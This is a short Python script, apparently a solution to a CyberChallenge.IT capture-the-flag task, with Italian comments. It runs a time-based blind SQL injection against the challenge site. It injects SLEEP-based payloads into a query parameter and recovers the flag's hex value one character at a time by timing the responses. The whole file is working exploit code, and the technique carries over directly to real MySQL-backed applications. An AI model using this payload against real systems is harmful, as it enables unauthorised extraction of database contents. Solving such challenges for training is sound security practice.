from Inj import Inj
from time import time 

inj = Inj('http://sqlinjection.challs.cyberchallenge.it')

dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        start = time()
        question = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
        inj.time(question)
        elapsed = time() - start
        if elapsed > 1:  # We have a match!
            result += c
            print(result)
            break
    else:
        break  # Yup, i cicli for in Python hanno una sezione else.
               # Significa che abbiamo esaurito i caratteri del
               # dizionario.
